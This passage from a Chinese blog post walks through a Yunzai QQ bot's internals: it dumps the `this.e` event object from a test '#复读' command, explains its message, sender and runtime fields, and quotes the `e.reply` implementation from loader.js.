群聊是否撤回消息，0-120秒，0不撤回</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> data.at 是否at用户</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="title function_">reply</span>(<span class="params">msg = <span class="string">&quot;&quot;</span>, quote = <span class="literal">false</span>, data = &#123;&#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">e</span>?.<span class="property">reply</span> || !msg) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">e</span>.<span class="title function_">reply</span>(msg, quote, data)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>然后会调用自定义实现的func函数，在setcontext之后，后续收到的消息会将程序执行流转到另一个自定义的函数doRep。最终bot实际发送消息是用<code>this.reply</code>这个接口实现的，在父类中看，调用了e对象中的reply。</p>
<h5 id="e对象结构"><a href="#e对象结构" class="headerlink" title="e对象结构"></a>e对象结构</h5><p>我们要想稍微深入一点理解执行过程，就首先得知道<code>this.e</code>是个什么对象。我们可以加一个console.log来在日志中记录这个e的具体结构。加上之后给bot发<code>#复读</code>看看结构。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125230821783.png"
                      class=""
                >
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line">&lt;ref *<span class="number">1</span>&gt; <span class="punctuation">&#123;</span></span><br><span class="line">  message_type<span class="punctuation">:</span> &#x27;group&#x27;<span class="punctuation">,</span></span><br><span class="line">  sub_type<span class="punctuation">:</span> &#x27;normal&#x27;<span class="punctuation">,</span></span><br><span class="line">  message_id<span class="punctuation">:</span> <span class="number">32652067</span><span class="punctuation">,</span></span><br><span class="line">  group_id<span class="punctuation">:</span> <span class="number">1003519385</span><span class="punctuation">,</span></span><br><span class="line">  user_id<span class="punctuation">:</span> <span class="number">2583727188</span><span class="punctuation">,</span></span><br><span class="line">  anonymous<span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">  message<span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">&#123;</span> text<span class="punctuation">:</span> &#x27;#复读&#x27;<span class="punctuation">,</span> type<span class="punctuation">:</span> &#x27;text&#x27; <span class="punctuation">&#125;</span> <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  raw_message<span class="punctuation">:</span> &#x27;#复读&#x27;<span class="punctuation">,</span></span><br><span class="line">  font<span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  sender<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    user_id<span class="punctuation">:</span> <span class="number">2583727188</span><span class="punctuation">,</span></span><br><span class="line">    nickname<span class="punctuation">:</span> &#x27;collectcrop&#x27;<span class="punctuation">,</span></span><br><span class="line">    card<span class="punctuation">:</span> &#x27;collectcrop&#x27;<span class="punctuation">,</span></span><br><span class="line">    sex<span class="punctuation">:</span> &#x27;unknown&#x27;<span class="punctuation">,</span></span><br><span class="line">    age<span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    area<span class="punctuation">:</span> &#x27;&#x27;<span class="punctuation">,</span></span><br><span class="line">    level<span class="punctuation">:</span> &#x27;<span class="number">2</span>&#x27;<span class="punctuation">,</span></span><br><span class="line">    role<span class="punctuation">:</span> &#x27;owner&#x27;<span class="punctuation">,</span></span><br><span class="line">    title<span class="punctuation">:</span> &#x27;&#x27;</span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  time<span class="punctuation">:</span> <span class="number">1732547237</span><span class="punctuation">,</span></span><br><span class="line">  self_id<span class="punctuation">:</span> <span class="number">3832600704</span><span class="punctuation">,</span></span><br><span class="line">  post_type<span class="punctuation">:</span> &#x27;message&#x27;<span class="punctuation">,</span></span><br><span class="line">  raw<span class="punctuation">:</span> &#x27;<span class="punctuation">&#123;</span><span class="attr">&quot;message_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;group&quot;</span><span class="punctuation">,</span><span class="attr">&quot;sub_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;normal&quot;</span><span class="punctuation">,</span><span class="attr">&quot;message_id&quot;</span><span class="punctuation">:</span><span class="number">32652067</span><span class="punctuation">,</span><span class="attr">&quot;group_id&quot;</span><span class="punctuation">:</span><span class="number">1003519385</span><span class="punctuation">,</span><span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span><span class="number">2583727188</span><span class="punctuation">,</span><span class="attr">&quot;anonymous&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;text&quot;</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;text&quot;</span><span class="punctuation">:</span><span class="string">&quot;#\\u590D\\u8BFB&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;raw_message&quot;</span><span class="punctuation">:</span><span class="string">&quot;#\\u590D\\u8BFB&quot;</span><span class="punctuation">,</span><span class="attr">&quot;font&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;sender&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span><span class="number">2583727188</span><span class="punctuation">,</span><span class="attr">&quot;nickname&quot;</span><span class="punctuation">:</span><span class="string">&quot;collectcrop&quot;</span><span class="punctuation">,</span><span class="attr">&quot;card&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="string">&quot;unknown&quot;</span><span class="punctuation">,</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;area&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;level&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;owner&quot;</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;time&quot;</span><span class="punctuation">:</span><span class="number">1732547237</span><span class="punctuation">,</span><span class="attr">&quot;self_id&quot;</span><span class="punctuation">:</span><span class="number">3832600704</span><span class="punctuation">,</span><span class="attr">&quot;post_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;message&quot;</span><span class="punctuation">&#125;</span>&#x27;<span class="punctuation">,</span></span><br><span class="line">  bot<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    adapter<span class="punctuation">:</span> OneBotv11Adapter <span class="punctuation">&#123;</span></span><br><span class="line">      id<span class="punctuation">:</span> &#x27;QQ&#x27;<span class="punctuation">,</span></span><br><span class="line">      name<span class="punctuation">:</span> &#x27;OneBotv11&#x27;<span class="punctuation">,</span></span><br><span class="line">      path<span class="punctuation">:</span> &#x27;OneBotv11&#x27;<span class="punctuation">,</span></span><br><span class="line">      echo<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      timeout<span class="punctuation">:</span> <span class="number">60000</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    ws<span class="punctuation">:</span> WebSocket <span class="punctuation">&#123;</span></span><br><span class="line">      _events<span class="punctuation">:</span> <span class="punctuation">[</span>Object<span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span> prototype<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      _eventsCount<span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">      _maxListeners<span class="punctuation">:</span> undefined<span class="punctuation">,</span></span><br><span class="line">      _binaryType<span class="punctuation">:</span> &#x27;nodebuffer&#x27;<span class="punctuation">,</span></span><br><span class="line">      _closeCode<span class="punctuation">:</span> <span class="number">1006</span><span class="punctuation">,</span></span><br><span class="line">      _closeFrameReceived<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      _closeFrameSent<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      _closeMessage<span class="punctuation">:</span> &lt;Buffer &gt;<span class="punctuation">,</span></span><br><span class="line">      _closeTimer<span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      _errorEmitted<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      _extensions<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      _paused<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      _protocol<span class="punctuation">:</span> &#x27;&#x27;<span class="punctuation">,</span></span><br><span class="line">      _readyState<span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      _receiver<span class="punctuation">:</span> <span class="punctuation">[</span>Receiver<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      _sender<span class="punctuation">:</span> <span class="punctuation">[</span>Sender<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      _socket<span class="punctuation">:</span> <span class="punctuation">[</span>Socket<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      _autoPong<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      _isServer<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      rid<span class="punctuation">:</span> &#x27;<span class="punctuation">:</span><span class="punctuation">:</span>ffff<span class="punctuation">:</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="punctuation">:</span><span class="number">52599</span>-dldWBbcOj0mF9sQR9Mpc6g==&#x27;<span class="punctuation">,</span></span><br><span class="line">      sid<span class="punctuation">:</span> &#x27;ws<span class="punctuation">:</span><span class="comment">//127.0.0.1:2536/OneBotv11&#x27;,</span></span><br><span class="line">      sendMsg<span class="punctuation">:</span> <span class="punctuation">[</span>Function (anonymous)<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">[</span>Symbol(shapeMode)<span class="punctuation">]</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">[</span>Symbol(kCapture)<span class="punctuation">]</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    sendApi<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> sendApi<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    stat<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      start_time<span class="punctuation">:</span> <span class="number">1732545494</span><span class="punctuation">,</span></span><br><span class="line">      stat<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      lost_pkt_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      lost_times<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      recv_msg_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      recv_pkt_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      sent_msg_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      sent_pkt_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      app_initialized<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      app_enabled<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      app_good<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      online<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      good<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    model<span class="punctuation">:</span> &#x27;TRSS Yunzai &#x27;<span class="punctuation">,</span></span><br><span class="line">    info<span class="punctuation">:</span> <span class="punctuation">&#123;</span> user_id<span class="punctuation">:</span> <span class="number">3832600704</span><span class="punctuation">,</span> nickname<span class="punctuation">:</span> &#x27;testbot&#x27; <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    uin<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    nickname<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    avatar<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setProfile<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setProfile<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setNickname<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setNickname<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setAvatar<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setAvatar<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    pickFriend<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> pickFriend<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    pickUser<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getFriendArray<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getFriendArray<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getFriendList<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getFriendList<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getFriendMap<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getFriendMap<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    fl<span class="punctuation">:</span> Map(<span class="number">3</span>) <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="number">66600000</span> =&gt; <span class="punctuation">[</span>Object<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="number">2583727188</span> =&gt; <span class="punctuation">[</span>Object<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="number">3832600704</span> =&gt; <span class="punctuation">[</span>Object<span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    pickMember<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> pickMember<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    pickGroup<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> pickGroup<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getGroupArray<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getGroupArray<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getGroupList<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getGroupList<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getGroupMap<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getGroupMap<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getGroupMemberMap<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getGroupMemberMap<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    gl<span class="punctuation">:</span> Map(<span class="number">1</span>) <span class="punctuation">&#123;</span> <span class="number">1003519385</span> =&gt; <span class="punctuation">[</span>Object<span class="punctuation">]</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    gml<span class="punctuation">:</span> Map(<span class="number">1</span>) <span class="punctuation">&#123;</span> <span class="number">1003519385</span> =&gt; <span class="punctuation">[</span>Map<span class="punctuation">]</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    request_list<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getSystemMsg<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getSystemMsg<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setFriendAddRequest<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setFriendAddRequest<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setGroupAddRequest<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setGroupAddRequest<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    cookies<span class="punctuation">:</span> <span class="punctuation">&#123;</span> &#x27;aq.qq.com&#x27;<span class="punctuation">:</span> undefined <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    getCookies<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getCookies<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getCsrfToken<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getCsrfToken<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    guild_info<span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">    clients<span class="punctuation">:</span> undefined<span class="punctuation">,</span></span><br><span class="line">    version<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      app_name<span class="punctuation">:</span> &#x27;Lagrange.OneBot&#x27;<span class="punctuation">,</span></span><br><span class="line">      app_version<span class="punctuation">:</span> &#x27;<span class="number">0.0</span><span class="number">.3</span>&#x27;<span class="punctuation">,</span></span><br><span class="line">      protocol_version<span class="punctuation">:</span> &#x27;v11&#x27;<span class="punctuation">,</span></span><br><span class="line">      nt_protocol<span class="punctuation">:</span> &#x27;Linux | <span class="number">3.2</span><span class="number">.10</span><span class="number">-25765</span>&#x27;<span class="punctuation">,</span></span><br><span class="line">      id<span class="punctuation">:</span> &#x27;QQ&#x27;<span class="punctuation">,</span></span><br><span class="line">      name<span class="punctuation">:</span> &#x27;OneBotv11&#x27;<span class="punctuation">,</span></span><br><span class="line">      version<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    bkn<span class="punctuation">:</span> <span class="number">202881165</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  group_name<span class="punctuation">:</span> &#x27;testbot、collec...&#x27;<span class="punctuation">,</span></span><br><span class="line">  adapter_id<span class="punctuation">:</span> &#x27;QQ&#x27;<span class="punctuation">,</span></span><br><span class="line">  adapter_name<span class="punctuation">:</span> &#x27;OneBotv11&#x27;<span class="punctuation">,</span></span><br><span class="line">  reply<span class="punctuation">:</span> <span class="punctuation">[</span>AsyncFunction (anonymous)<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  msg<span class="punctuation">:</span> &#x27;#复读&#x27;<span class="punctuation">,</span></span><br><span class="line">  logText<span class="punctuation">:</span> &#x27;\x1B<span class="punctuation">[</span><span class="number">36</span>m<span class="punctuation">[</span>testbot、collec...(<span class="number">1003519385</span>)<span class="punctuation">,</span> collectcrop(<span class="number">2583727188</span>)<span class="punctuation">]</span>\x1B<span class="punctuation">[</span><span class="number">39</span>m\x1B<span class="punctuation">[</span><span class="number">31</span>m<span class="punctuation">[</span>#复读<span class="punctuation">]</span>\x1B<span class="punctuation">[</span><span class="number">39</span>m&#x27;<span class="punctuation">,</span></span><br><span class="line">  isGroup<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  recall<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> bound recallMsg<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  isMaster<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  runtime<span class="punctuation">:</span> Runtime <span class="punctuation">&#123;</span></span><br><span class="line">    e<span class="punctuation">:</span> <span class="punctuation">[</span>Circular *<span class="number">1</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    _mysInfo<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    handler<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      has<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> has<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      call<span class="punctuation">:</span> <span class="punctuation">[</span>AsyncFunction<span class="punctuation">:</span> call<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      callAll<span class="punctuation">:</span> <span class="punctuation">[</span>AsyncFunction<span class="punctuation">:</span> callAll<span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  original_msg<span class="punctuation">:</span> &#x27;#复读&#x27;<span class="punctuation">,</span></span><br><span class="line">  logFnc<span class="punctuation">:</span> &#x27;\x1B<span class="punctuation">[</span><span class="number">34</span>m<span class="punctuation">[</span>复读(repeat)<span class="punctuation">]</span>\x1B<span class="punctuation">[</span><span class="number">39</span>m&#x27;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
<h6 id="核心信息"><a href="#核心信息" class="headerlink" title="核心信息"></a><strong>核心信息</strong></h6><ul>
<li><strong><code>message_type</code></strong>: 表示消息类型。<ul>
<li><code>&quot;group&quot;</code>: 群聊消息。</li>
<li><code>&quot;private&quot;</code>: 私聊消息。</li>
</ul>
</li>
<li><strong><code>sub_type</code></strong>: 子类型。<ul>
<li>对于群聊消息，常见值是 <code>&quot;normal&quot;</code>，表示普通消息。</li>
</ul>
</li>
<li><strong><code>message_id</code></strong>: 消息 ID，可用于引用或撤回这条消息。</li>
<li><strong><code>group_id</code></strong>: 群号，仅当消息类型是 <code>&quot;group&quot;</code> 时存在。</li>
<li><strong><code>user_id</code></strong>: 发送者的 QQ 号。</li>
<li><strong><code>message</code></strong>: 消息的具体内容，数组形式，每个元素是一个对象，表示消息的组成部分。<ul>
<li><strong>示例</strong>: <code>[ &#123; text: &#39;#复读&#39;, type: &#39;text&#39; &#125; ]</code></li>
</ul>
</li>
<li><strong><code>raw_message</code></strong>: 消息的原始内容，字符串形式。<ul>
<li><strong>示例</strong>: <code>&quot;#复读&quot;</code></li>
</ul>
</li>
<li><strong><code>sender</code></strong>: 发送者信息，包含以下字段：<ul>
<li><code>user_id</code>: 发送者 QQ 号。</li>
<li><code>nickname</code>: 昵称。</li>
<li><code>card</code>: 群名片。</li>
<li><code>sex</code>: 性别，值可能是 <code>&quot;male&quot;</code>、<code>&quot;female&quot;</code> 或 <code>&quot;unknown&quot;</code>。</li>
<li><code>level</code>: 群等级。</li>
<li><code>role</code>: 群内角色，可能是 <code>&quot;owner&quot;</code>（群主）、<code>&quot;admin&quot;</code>（管理员）或 <code>&quot;member&quot;</code>（普通成员）。</li>
</ul>
</li>
</ul>
<hr>
<h6 id="扩展信息"><a href="#扩展信息" class="headerlink" title="扩展信息"></a><strong>扩展信息</strong></h6><ul>
<li><strong><code>self_id</code></strong>: 机器人的 QQ 号。</li>
<li><strong><code>post_type</code></strong>: 事件类型。<ul>
<li><code>&quot;message&quot;</code>: 消息事件。</li>
</ul>
</li>
<li><strong><code>time</code></strong>: 发送时间的时间戳（Unix 时间）。</li>
<li><strong><code>isGroup</code></strong>: 布尔值，表示消息是否来自群聊。</li>
<li><strong><code>isMaster</code></strong>: 布尔值，表示发送者是否为插件配置的主人。</li>
</ul>
<hr>
<h6 id="事件上下文管理"><a href="#事件上下文管理" class="headerlink" title="事件上下文管理"></a><strong>事件上下文管理</strong></h6><ul>
<li><code>runtime</code>: 插件运行时信息。<ul>
<li><code>runtime.e</code>: 当前事件对象（即 <code>this.e</code> 本身）。</li>
<li>其他属性用于管理事件处理流程。</li>
</ul>
</li>
</ul>
<h5 id="reply函数实现"><a href="#reply函数实现" class="headerlink" title="reply函数实现"></a>reply函数实现</h5><p>同样的方式，用<code>console.log(this.e.reply.toString());</code>，能动态查看这个reply函数的源码。然后再在vscode里搜索一下，最后在loader.js中找到了对应代码。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">e.<span class="property">reply</span> = <span class="title function_">async</span> (msg = <span class="string">&quot;&quot;</span>, quote = <span class="literal">false</span>, data = &#123;&#125;) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (!msg) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> &#123; recallMsg = <span class="number">0</span>, at = <span class="string">&quot;&quot;</span> &#125; = data</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (at &amp;&amp; e.<span class="property">isGroup</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (at === <span class="literal">true</span>)</span><br><span class="line">          at = e.<span class="property">user_id</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(msg))</span><br><span class="line">          msg.<span class="title function_">unshift</span>(segment.<span class="title function_">at</span>(at), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          msg = [segment.<span class="title function_">at</span>(at), <span class="string">&quot;\n&quot;</span>, msg]</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (quote &amp;&amp; e.<span class="property">message_id</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(msg))</span><br><span class="line">          msg.<span class="title function_">unshift</span>(segment.<span class="title function_">reply</span>(e.<span class="property">message_id</span>))</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          msg = [segment.<span class="title function_">reply</span>(e.<span class="property">message_id</span>), msg]</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> res</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res = <span class="keyword">await</span> <span class="title function_">reply</span>(msg)</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="title class_">Bot</span>.<span class="title function_">makeLog</span>(<span class="string">&quot;error&quot;</span>, [<span class="string">&quot;发送消息错误&quot;</span>, msg, err], e.<span class="property">self_id</span>)</span><br><span class="line">        res = &#123; <span class="attr">error</span>: [err] &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (recallMsg &gt; <span class="number">0</span> &amp;&amp; res?.<span class="property">message_id</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">group</span>?.<span class="property">recallMsg</span>)</span><br><span class="line">          <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            e.<span class="property">group</span>.<span class="title function_">recallMsg</span>(res.<span class="property">message_id</span>)</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">message_id</span>)</span><br><span class="line">              e.<span class="property">group</span>.<span class="title function_">recallMsg</span>(e.<span class="property">message_id</span>)</span><br><span class="line">          &#125;, recallMsg * <span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">friend</span>?.<span class="property">recallMsg</span>)</span><br><span class="line">          <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            e.<span class="property">friend</span>.<span class="title function_">recallMsg</span>(res.<span class="property">message_id</span>)</span><br><span class="line">            <span class="keyword">if</span> (e.<span 